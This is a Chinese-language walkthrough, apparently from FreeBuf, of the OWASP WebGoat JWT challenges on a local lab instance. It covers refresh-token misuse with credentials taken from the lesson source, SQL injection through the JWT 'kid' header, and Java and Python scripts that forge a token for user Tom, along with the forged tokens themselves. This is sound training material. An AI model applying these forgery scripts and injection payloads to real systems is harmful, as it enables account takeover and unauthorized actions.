![](https://image.3001.net/images/20191012/1570852167_5da14d4732851.jpg!small)

利用账号密码：Jerry/bm5nhSkxCXZkKRy4 拿到refresh token

账号密码从源码中可得  
![](https://image.3001.net/images/20191012/1570852183_5da14d5735719.jpg!small)

利用Jerry的refresh token和Tom的过期access token 去刷新。  
![](https://image.3001.net/images/20191012/1570852194_5da14d62bf8b1.jpg!small)

拿到刷新后的access_token 结账  
![](https://image.3001.net/images/20191012/1570852235_5da14d8bafa61.jpg!small)

总结：

> 当使用refresh_token机制时，服务器端存储足够的信息，以验证用户是否仍然受信任。（存储IP地址，跟踪使用refresh
> token的次数及是否在access_token过期后使用等等的信息）
>
> 当存在JWT泄漏和越权刷新JWT漏洞时，将会是个灾难。

##  **Final challenges**

接下来，我们看到Tom and Jerry，我们是Jerry的账号，想把Tom的账号删掉。  
![](https://image.3001.net/images/20191012/1570852258_5da14da2d11bd.jpg!small)点击Tom下方的Delete，截取报文：

    
    
    POST /WebGoat/JWT/final/delete?token=eyJ0eXAiOiJKV1QiLCJraWQiOiJ3ZWJnb2F0X2tleSIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiSmVycnkiLCJFbWFpbCI6ImplcnJ5QHdlYmdvYXQuY29tIiwiU**sZSI6WyJDYXQiXX0.CgZ27DzgVW8gzc0n6izOU638uUCi6UhiOJKYzoEZGE8 HTTP/1.1
    Host: 127.0.0.1:8080
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
    Accept: */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Connection: close
    Referer: http://127.0.0.1:8080/WebGoat/start.mvc
    Cookie: JSESSIONID=IdCcPJUZYU_2PTrz3wiXbJkNfyoJktHX2tbNhiab; JSESSIONID.3f016d14=node01p93mn1law5to1bzrhlqsjmjcz4.node0; screenResolution=1680x1050
    Content-Length: 0

将token丢到[https://jwt.io/#debugger解析一下：](https://jwt.io/#debugger%E8%A7%A3%E6%9E%90%E4%B8%80%E4%B8%8B%EF%BC%9A)  
![](https://image.3001.net/images/20191012/1570852287_5da14dbfc1471.jpg!small)

原始JWT parser后：

    
    
    header
    {
      "typ": "JWT",
     ** "kid": "webgoat_key",**
      "alg": "HS256"
    }
    payload
    {
      "iss": "WebGoat Token Builder",
      "iat": 1524210904,
      "exp": 1618905304,
      "aud": "webgoat.org",
      "sub": "jerry@webgoat.com",
    **  "username": "Jerry",**
      "Email": "jerry@webgoat.com",
      "Role": [
        "Cat"
      ]
    }

查看代码：

    
    
    @AssignmentPath("/JWT/final")
    @AssignmentHints({"jwt-final-hint1", "jwt-final-hint2", "jwt-final-hint3", "jwt-final-hint4", "jwt-final-hint5", "jwt-final-hint6"})
    public class JWTFinalEndpoint extends AssignmentEndpoint {
        @Autowired
        private WebSession webSession;
        @PostMapping("follow/{user}")
        public @ResponseBody
        String follow(@PathVariable("user") String user) {
            if ("Jerry".equals(user)) {
                return "Following yourself seems redundant";
            } else {
                return "You are now following Tom";
            }
        }
        @PostMapping("delete")
        public @ResponseBody
        AttackResult resetVotes(@RequestParam("token") String token) {
            if (StringUtils.isEmpty(token)) {
                return trackProgress(failed().feedback("jwt-invalid-token").build());
            } else {
                try {
                    final String[] errorMessage = {null};
                    Jwt jwt = Jwts.parser().setSigningKeyResolver(new SigningKeyResolverAdapter() {
                        @Override
                        public byte[] resolveSigningKeyBytes(JwsHeader header, Claims claims) {
                            final String kid = (String) header.get("kid");
                            try {
                                Connection connection = DatabaseUtilities.getConnection(webSession);
                                ResultSet rs = connection.createStatement().executeQuery("SELECT key FROM jwt_keys WHERE id = '" + kid + "'");
                                while (rs.next()) {
                                    return TextCodec.BASE64.decode(rs.getString(1));
                                }
                            } catch (SQLException e) {
                                errorMessage[0] = e.getMessage();
                            }
                            return null;
                        }
                    }).parseClaimsJws(token);
                    if (errorMessage[0] != null) {
                        return trackProgress(failed().output(errorMessage[0]).build());
                    }
                    Claims claims = (Claims) jwt.getBody();
                    String username = (String) claims.get("username");
                    if ("Jerry".equals(username)) {
                        return trackProgress(failed().feedback("jwt-final-jerry-account").build());
                    }
                    if ("Tom".equals(username)) {
                        return trackProgress(success().build());
                    } else {
                        return trackProgress(failed().feedback("jwt-final-not-tom").build());
                    }
                } catch (JwtException e) {
                    return trackProgress(failed().feedback("jwt-invalid-token").output(e.toString()).build());
                }
            }
        }
    }

重点关注resetVotes方法：

校验参数token是否为空

解析token：

Jwts.parser().setSigningKeyResolver(自定义方法获取签名KEY).parseClaimsJws(token);

自定义方法：

从JwsHeader中获取“kid”直接插入sql查询语句中，存在sql injection，将查看结果返回作为KEY进行解析。

获取解析后的JWT body中的username，若为Tom，则成功！

    
    
     ResultSet rs = connection.createStatement().executeQuery("SELECT key FROM jwt_keys WHERE id = '" + kid + "'");
                                while (rs.next()) {
                                    return TextCodec.BASE64.decode(rs.getString(1));
    
    
    @PostMapping("delete")
        public @ResponseBody
        AttackResult resetVotes(@RequestParam("token") String token) {
            if (StringUtils.isEmpty(token)) {
                return trackProgress(failed().feedback("jwt-invalid-token").build());
            } else {
                try {
                    final String[] errorMessage = {null};
                    Jwt jwt = Jwts.parser().setSigningKeyResolver(new SigningKeyResolverAdapter() {
                        @Override
                        public byte[] resolveSigningKeyBytes(JwsHeader header, Claims claims) {
                            final String kid = (String) header.get("kid");
                            try {
                                Connection connection = DatabaseUtilities.getConnection(webSession);
                                ResultSet rs = connection.createStatement().executeQuery("SELECT key FROM jwt_keys WHERE id = '" + kid + "'");
                                while (rs.next()) {
                                    return TextCodec.BASE64.decode(rs.getString(1));
                                }
                            } catch (SQLException e) {
                                errorMessage[0] = e.getMessage();
                            }
                            return null;
                        }
                    }).parseClaimsJws(token);
                    if (errorMessage[0] != null) {
                        return trackProgress(failed().output(errorMessage[0]).build());
                    }
                    Claims claims = (Claims) jwt.getBody();
                    String username = (String) claims.get("username");
                    if ("Jerry".equals(username)) {
                        return trackProgress(failed().feedback("jwt-final-jerry-account").build());
                    }
                    if ("Tom".equals(username)) {
                        return trackProgress(success().build());
                    } else {
                        return trackProgress(failed().feedback("jwt-final-not-tom").build());
                    }
                } catch (JwtException e) {
                    return trackProgress(failed().feedback("jwt-invalid-token").output(e.toString()).build());
                }
            }
        }

**收集到的信息：**

> 1.JWT中原始数据： "kid": "webgoat_key"
>
> sql语句："SELECT key FROM jwt_keys WHERE id = '" + kid + "'";
>
> 那么就是说明，jwt_keys表中有一个id的值是：“webgoat_key”
>
>
> 2.Jwts.parser().setSigningKeyResolver(自定义方法获取签名KEY).parseClaimsJws(token);//通过自定义方法获取签名key然后对token进行JWT解析
>
> 3.JWT中username要等于Tom

**思路：**  
篡改JWT：

利用sql inject，控制查询语句的查询值来控制JWT的密钥，从而伪造JWT，完成任务。

步骤：

> 1.从收集的信息中可以构造出sql语句 select **id** from jwt_keys where **id**
> ='webgoat_key';这个查询结果会输出'webgoat_key',所以在[https://jwt.io/#debugger篡改JWT中的"kid](https://jwt.io/#debugger%E7%AF%A1%E6%94%B9JWT%E4%B8%AD%E7%9A%84%22kid)":
> "y' and 1=2 union select **id** from jwt_keys where **id**
> ='webgoat_key"；签名设置为webgoat_key
>
> 2.在payload的username篡改成Tom
>
> 3.提交篡改后的JWT进行验证。

![](https://image.3001.net/images/20191012/1570852334_5da14deebf7b8.jpg!small)

失败了。那就来跟踪一下代码执行的情况，定位问题吧。  
￼![](https://image.3001.net/images/20191012/1570852354_5da14e0295efc.jpg!small)

sql injection的payload确实进来了。  
![](https://image.3001.net/images/20191012/1570852366_5da14e0ea3dac.jpg!small)

执行的结果也和我们设想的一样，目前没有问题。所以问题就在签名部分没有通过。（值得注意:尽管签名校验没通过，但sql
injection的payload已经执行）  
￼![](https://image.3001.net/images/20191012/1570852380_5da14e1c18f60.jpg!small)

Java版本

    
    
    import java.util.ArrayList;
    import io.jsonwebtoken.Claims;
    import io.jsonwebtoken.Jwts;
    public class JWTcryptotest {
        public static final String JWT_PASSWORD = "webgoat_key";
        #public static byte[] JWT_PASSWORD = TextCodec.BASE64.decode("webgoat_key");//这样也可以，得出的密文一样。
        public static void createJWTToken() {
            Claims claims = Jwts.claims();
            claims.put("iat", 1529569536);
            claims.put("iss", "WebGoat Token Builder");
            claims.put("exp", 1618905304);
            claims.put("aud", "webgoat.org");
            claims.put("sub", "jerry@webgoat.com");
            claims.put("username", "Tom");
            claims.put("Email", "jerry@webgoat.com");
            ArrayList<String> roleList = new ArrayList<String>();
            roleList.add("Cat");
            claims.put("Role", roleList);
            String token = Jwts.builder().setClaims(claims).setHeaderParam("typ", "JWT")
                    .setHeaderParam("kid", "123' and 1=2 union select id FROM jwt_keys WHERE id='webgoat_key")
                    .signWith(io.jsonwebtoken.SignatureAlgorithm.HS256, JWT_PASSWORD).compact();
            System.out.println(token);
        }
        public static void main(String[] args) {
            JWTcryptotest.createJWTToken();
        }
    }

![](https://image.3001.net/images/20191012/1570852406_5da14e3675cc3.jpg!small)

    
    
    eyJ0eXAiOiJKV1QiLCJraWQiOiIxMjMnIGFuZCAxPTIgdW5pb24gc2VsZWN0IGlkIEZST00gand0X2tleXMgV0hFUkUgaWQ9J3dlYmdvYXRfa2V5IiwiYWxnIjoiSFMyNTYifQ.eyJpYXQiOjE1Mjk1Njk1MzYsImlzcyI6IldlYkdvYXQgVG9rZW4gQnVpbGRlciIsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiVG9tIiwiRW1haWwiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsIlJvbGUiOlsiQ2F0Il19.HThQlDWlvbshn4BnzQ_2RU1DVmYl4dnfiEJmPWpA0b4

这样就通过了。  
![](https://image.3001.net/images/20191012/1570852426_5da14e4a17964.jpg!small)但在jwt.io中未能通过  
![](https://image.3001.net/images/20191012/1570852496_5da14e9060785.jpg!small)

关于python脚本的方式，根据调试我们也可以知道，在"kid":
"webgoat_key"的时候，签名key是："qwertyqwerty1234"，使用如下脚本得出JWT：

    
    
    #!/usr/bin/env python
    # -*- coding:utf-8 -*-    # author:jack
    # datetime:2019-09-26 17:06
    # software: PyCharm
    import jwt
    import base64
    # payload
    token_dict = {
        "iat": 1529569536,
        "iss": "WebGoat Token Builder",
        "exp": 1618905304,
        "aud": "webgoat.org",
        "sub": "jerry@webgoat.com",
        "username": "Tom",
        "Email": "jerry@webgoat.com",
        "Role": ["Cat"]
    }
    key = base64.b64decode("qwertyqwerty1234")
    # headers
    headers = {
        "typ": "JWT",
        # "kid": "123' and 1=2 union select id FROM jwt_keys WHERE id='webgoat_key",
        "kid": "webgoat_key",
        "alg": "HS256"
    }
    # 调用jwt库,生成json web token
    jwt_token = jwt.encode(token_dict,  # payload, 有效载体
                           key,  # 进行加密签名的密钥
                           algorithm="HS256",  # 指明签名算法方式, 默认也是HS256
                           headers=headers  # json web token 数据结构包含两部分, payload(有效载体), headers(标头)
                           ).decode('ascii')  # python3 编码后得到 bytes, 再进行解码(指明解码的格式), 得到一个str
    print(jwt_token)

签名：

    
    
    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IndlYmdvYXRfa2V5In0.eyJpYXQiOjE1Mjk1Njk1MzYsImlzcyI6IldlYkdvYXQgVG9rZW4gQnVpbGRlciIsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiVG9tIiwiRW1haWwiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsIlJvbGUiOlsiQ2F0Il19.6cuviRab-boP6raqinzKYuUmHUM4PpPWsnXAQMv3738

放到请求包中也能通过，说明签名没问题。

![](https://image.3001.net/images/20191012/1570852519_5da14ea79d1a4.jpg!small)jwt.io中也通过了。  
![](https://image.3001.net/images/20191012/1570852559_5da14ecfaab3b.jpg!small)但![](https://image.3001.net/images/20191012/1570852570_5da14edacfbb5.jpg!small)将key设成：webgoat_key的时候，会抛出错误：  

这个时候你可能会问，为什么key要先做base64 decode处理？

因为下方代码块中的：

return TextCodec.BASE64.decode(rs.getString(1));

    
    
    final String[] errorMessage = {null};
                    Jwt jwt = Jwts.parser().setSigningKeyResolver(new SigningKeyResolverAdapter() {
                        @Override
                        public byte[] resolveSigningKeyBytes(JwsHeader header, Claims claims) {
                            final String kid = (String) header.get("kid");
                            try {
                                Connection connection = DatabaseUtilities.getConnection(webSession);
                                ResultSet rs = connection.createStatement().executeQuery("SELECT key FROM jwt_keys WHERE id = '" + kid + "'");
                                while (rs.next()) {
                                    System.out.println(rs.getString(1));
                                    System.out.println(TextCodec.BASE64.decode(rs.getString(1)));
                                    return TextCodec.BASE64.decode(rs.getString(1));
                                }
                            } catch (SQLException e) {
                                errorMessage[0] = e.getMessage();
                            }
                            return null;
                        }
                    }).parseClaimsJws(token);

总结：

> 1.对JWT，signature key爆破和篡改JWT的写法需要根据源码来相应设置。
>
> 2.对JWT，signature
> key爆破可尝试直接明文和base64encode两种（不排除其他种可能）；上文例子中，对明文key进行base64decode后作为signature
> key来签名，这种情况非常少见。
>
> 3.refresh_token越权篡改他人access_token问题值得注意，refresh_token出现频率低，测试人员漏测几率高。
>
> 4.可在JWT的headers，payload部分的参数值中插入常见漏洞相关payload去尝试，尽管我们不知道signature key。

本篇到此结束，感谢您的翻阅，期待您的宝贵意见。

 ***本文作者：DSO观星市场部，转载请注明来自FreeBuf.COM**

